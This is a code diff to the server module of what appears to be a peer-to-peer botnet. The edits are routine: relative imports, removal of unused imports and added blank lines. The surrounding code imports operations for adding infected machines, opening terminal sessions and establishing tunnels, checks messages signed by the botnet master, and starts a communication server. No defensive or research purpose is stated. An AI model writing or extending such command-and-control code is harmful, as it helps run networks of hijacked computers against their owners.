@@ -2,20 +2,18 @@
 
 import os
 import time
-import copy
 import socks
 import socket
 import logging
 import threading
-import subprocess
 
-from botnet_p2p import BUFFER_SIZE
-from botnet_p2p.operations import (
+from .botnet_p2p import BUFFER_SIZE
+from .botnet_p2p.operations import (
     add_new_infected_machine,
     terminal_session,
     establish_tunnel,
 )
-from botnet_p2p.message import breakdown_msg, signed_by_master
+from .botnet_p2p.message import breakdown_msg, signed_by_master
 
 logging.basicConfig(level=logging.DEBUG)
 
@@ -46,6 +44,7 @@ def setup_server():
     logging.info("Copying pids to process file ...")
     process_thread = threading.Thread(target=write_pids_to_process_file, args=())
     process_thread.start()
+
     logging.info("Starting communication server ...")
     server_socket = socket.socket()
     server_socket.bind((SERVER_HOST, SERVER_PORT))
@@ -60,6 +59,7 @@ def setup_server():
 def write_pids_to_process_file():
     with open(process_path, "w") as process_file:
         process_file.write(f"{os.getpid()}\n")
+
     len_file = 0
     while len_file < 2:
         os.system(
@@ -67,6 +67,7 @@ def write_pids_to_process_file():
             + process_path
         )
         time.sleep(5)
+
         with open(process_path, "r") as process_file:
             len_file = len(process_file.readlines())
 
